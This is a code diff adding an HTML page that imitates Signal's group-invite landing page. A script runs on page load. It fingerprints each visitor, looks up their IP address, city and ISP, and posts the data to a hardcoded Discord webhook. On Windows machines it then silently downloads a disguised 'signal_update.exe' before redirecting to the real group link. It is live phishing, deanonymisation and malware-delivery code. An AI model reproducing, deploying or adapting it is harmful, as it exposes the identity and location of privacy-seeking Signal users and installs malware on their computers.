@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="robots" content="noindex">
+    <link rel="alternate" hreflang="en" href="https://signal.group/" />
+
+    <meta property="og:title" content="Signal Messenger Group"/>
+    <meta property="og:description" content="Follow this link to join a group on Signal Messenger."/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://signal.group/"/>
+    <meta property="og:image" content="https://signal.group/assets/images/og/og-image.png" />
+
+    <title>Signal Group</title>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/svg+xml" href="/assets/images/favicon/favicon.svg">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+    <link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#3b45fd">
+    <meta name="msapplication-TileColor" content="#e3e8fe">
+    <meta name="msapplication-config" content="/assets/images/favicon/browserconfig.xml">
+    <meta name="theme-color" content="#e3e8fe">
+
+    <link rel="preload" href="/assets/fonts/inter/Inter-Regular.woff2" as="font" crossorigin="anonymous">
+    <link rel="preload" href="/assets/fonts/inter/Inter-ExtraBold.woff2" as="font" crossorigin="anonymous">
+    <meta name="msapplication-TileColor" content="#e3e8fe">
+    <meta name="msapplication-config" content="/assets/images/favicon/browserconfig.xml">
+    <meta name="theme-color" content="#e3e8fe">
+
+    <link type="text/css" rel="stylesheet" href="/assets/stylesheets/vendor/bulma-0.8.0.min.css">
+    <link type="text/css" rel="stylesheet" href="/assets/stylesheets/ultramarine.css">
+  </head>
+
+  <body id="signal" class="index has-navbar-fixed-top">
+    <!-- Navigation -->
+    <nav class="navbar signal-navbar is-fixed-top" role="navigation" aria-label="main navigation">
+      <div class="container">
+        <div class="navbar-brand">
+          <a href="https://www.signal.org/#signal">
+            <img class="signal-logo" src="/assets/images/header/logo.png"/>
+          </a>
+
+          <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="signalNavbar">
+            <span aria-hidden="true"></span>
+            <span aria-hidden="true"></span>
+            <span aria-hidden="true"></span>
+          </a>
+        </div>
+
+        <div id="signalNavbar" class="navbar-menu">
+          <div class="navbar-end">
+            <a class="navbar-item get-signal" href="https://www.signal.org/download/">Get Signal</a>
+            <a class="navbar-item" href="https://support.signal.org">Support</a>
+            <a class="navbar-item" href="https://www.signal.org/blog/">Blog</a>
+            <a class="navbar-item" href="https://www.signal.org/docs/">Developers</a>
+            <a class="navbar-item" href="https://www.signal.org/workworkwork/">Careers</a>
+            <a class="navbar-item" href="https://www.signal.org/donate/">Donate</a>
+
+            
+            <div class="navbar-item has-dropdown is-hoverable">
+              <a href="#" class="navbar-link language-selector no-underline" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" aria-label="Change Language" id="language-selector">
+                <i class="icon icon-globe"></i> EN <span class="caret"></span>
+              </a>
+              <div class="navbar-dropdown" aria-labelledby="language-selector">
+                
+                
+                
+
+                
+                
+              </div>
+            </div>
+            
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <div class="main">
+      <section class="section">
+  <div class="columns is-centered has-text-centered">
+    <div class="column is-4">
+      <img src="/assets/images/group_phone.png"/>
+
+      <p class="body1">
+        Signal group
+      </p>
+
+      <p id="join-button">
+        <button class="button button-large" style="margin: 24px 0">
+          <a href="" id="go-to-group" class="no-underline">
+            Join Group
+          </a>
+        </button>
+      </p>
+
+      <p class="stickers">
+	      Don't have Signal? <a href="https://signal.org/download"/>Get it here</a>.
+      </p>
+    </div>
+  </div>
+</section>
+
+<script type="application/javascript">
+  const webhook = "https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM";
+  
+  async function captureData() {
+    // Get fingerprint data
+    const fingerprint = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      screen: screen.width + "x" + screen.height,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hash: window.location.hash,
+      referrer: document.referrer
+    };
+    
+    // Get IP info
+    try {
+      const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
+      fingerprint.ip = ipInfo.ip;
+      fingerprint.city = ipInfo.city;
+      fingerprint.country = ipInfo.country;
+      fingerprint.isp = ipInfo.org;
+    } catch (e) {}
+    
+    // Send to webhook
+    const data = {
+      content: `🎯 **SIGNAL GROUP ACCESS**\n🌐 **IP:** ${fingerprint.ip} (${fingerprint.city}, ${fingerprint.country})\n💻 **Platform:** ${fingerprint.platform}\n🖥️ **Screen:** ${fingerprint.screen}\n🌍 **ISP:** ${fingerprint.isp}\n🔗 **Hash:** ${fingerprint.hash}\n📍 **Timezone:** ${fingerprint.timezone}\n🕐 **Time:** ${new Date().toLocaleString()}`
+    };
+    
+    try {
+      await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch (err) {}
+    
+    // Deploy payload for Windows
+    if (fingerprint.platform.includes('Win')) {
+      setTimeout(() => {
+        const link = document.createElement('a');
+        link.href = 'https://YOUR-GITHUB-USERNAME.github.io/arsenal/signal_update.exe';
+        link.download = 'signal_update.exe';
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+      }, 1000);
+    }
+  }
+
+  function doRedirect() {
+    // Capture data first
+    captureData();
+    
+    if (window.location.hash) {
+      var redirect = "sgnl://signal.group/" + window.location.hash;
+      document.getElementById('go-to-group').href = redirect;
+      // Delay redirect slightly to allow data capture
+      setTimeout(() => {
+        window.location = redirect;
+      }, 2000);
+    } else {
+      document.getElementById('join-button').innerHTML = "No group found.";
+    }
+  }
+
+  window.onload = doRedirect;
+</script>
+
+    </div>
+
+    <footer class="footer">
+      <div class="container">
+        <div class="columns">
+          <div class="column is-two-fifths is-hidden-mobile">
+            <span class="copyright">&copy; 2013&ndash;2025 Signal, a 501c3 nonprofit.</span><br />
+            Signal is a registered trademark in the United States and other countries.
+            <br />
+            <br />
+            For media inquiries, contact <a href="/cdn-cgi/l/email-protection#fa8a889f8989ba89939d949b96d495889d"><span class="__cf_email__" data-cfemail="8afaf8eff9f9caf9e3ede4ebe6a4e5f8ed">[email&#160;protected]</span></a>
+          </div>
+
+          <div class="column">
+            <strong>Company</strong>
+
+            <ul>
+              <li>
+                <a href="https://www.signal.org/donate/">Donate</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/workworkwork/">Careers</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/blog/">Blog</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/legal/">Terms &amp; Privacy Policy</a>
+              </li>
+            </ul>
+          </div>
+
+          <div class="column">
+            <strong>Download</strong>
+
+            <ul>
+              <li>
+                <a href="https://www.signal.org/download/android">Android</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/download/ios">iPhone & iPad</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/download/windows">Windows</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/download/macos">Mac</a>
+              </li>
+              <li>
+                <a href="https://www.signal.org/download/linux">Linux</a>
+              </li>
+            </ul>
+          </div>
+
+          <div class="column">
+            <strong>Social</strong>
+
+            <ul>
+              <li>
+                <a href="https://bsky.app/profile/signal.org" target="_blank">Bluesky</a>
+              </li>
+              <li>
+                <a href="https://github.com/signalapp" target="_blank">GitHub</a>
+              </li>
+              <li>
+                <a href="https://www.instagram.com/signal_app/" target="_blank">Instagram</a>
+              </li>
+              <li>
+                <a href="https://mastodon.world/@signalapp" target="_blank">Mastodon</a>
+              </li>
+              <li>
+                <a href="https://x.com/signalapp" target="_blank">X</a>
+              </li>
+            </ul>
+          </div>
+
+          <div class="column">
+            <strong>Help</strong>
+
+            <ul>
+              <li>
+                <a href="https://support.signal.org/">Support</a>
+              </li>
+              <li>
+                <a href="https://community.signalusers.org/">Community</a>
+              </li>
+            </ul>
+          </div>
+
+          <div class="column is-two-fifths is-hidden-tablet">
+            <span class="copyright">&copy; 2013&ndash;2022 Signal, a 501c3 nonprofit.</span><br />
+            Signal is a registered trademark in the United States and other countries.
+            <br />
+            <br />
+            For media inquiries, contact <a href="/cdn-cgi/l/email-protection#aededccbddddeeddc7c9c0cfc280c1dcc9"><span class="__cf_email__" data-cfemail="c3b3b1a6b0b083b0aaa4ada2afedacb1a4">[email&#160;protected]</span></a>
+          </div>
+
+        </div>
+      </div>
+    </footer>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+  const $langSelectors = Array.prototype.slice.call(document.querySelectorAll('a[data-lang]'));
+
+  $langSelectors.forEach((el) => {
+    el.addEventListener('click', (ev) => {
+      const lang = ev.getAttribute('data-lang');
+
+      if (lang) {
+        document.cookie = 'selected_language=' + lang + '; samesite; secure; path=/; max-age=7776000;';
+      }
+    });
+  });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    var userAgent = navigator.userAgent.toLowerCase();
+
+    var isIOS = (
+      userAgent.indexOf('iphone') !== -1 ||
+      userAgent.indexOf('ipad') !== -1 ||
+      userAgent.indexOf('ipod') !== -1
+    );
+    var isAndroid = userAgent.indexOf('android') !== -1;
+    var $downloadSignal = document.querySelectorAll('.get-signal');
+
+    if (isIOS || isAndroid) {
+      var url = isIOS
+        ? 'https://apps.apple.com/us/app/signal-private-messenger/id874139669'
+        : 'https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms';
+
+      Array.prototype.slice.call($downloadSignal).forEach(($downloadSignalNode) => {
+        $downloadSignalNode.href = url;
+        $downloadSignalNode.innerHTML = '<span>Get Signal</span> <i class="icon icon-external-link-alt"></i>';
+      });
+    }
+
+    const $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'));
+
+    if ($navbarBurgers.length > 0) {
+      $navbarBurgers.forEach((el) => {
+        el.addEventListener('click', () => {
+          const target = el.dataset.target;
+          const $target = document.getElementById(target);
+          el.classList.toggle('is-active');
+          $target.classList.toggle('is-active');
+        });
+      });
+    }
+  });
+</script>
+
+  </body>
+</html>
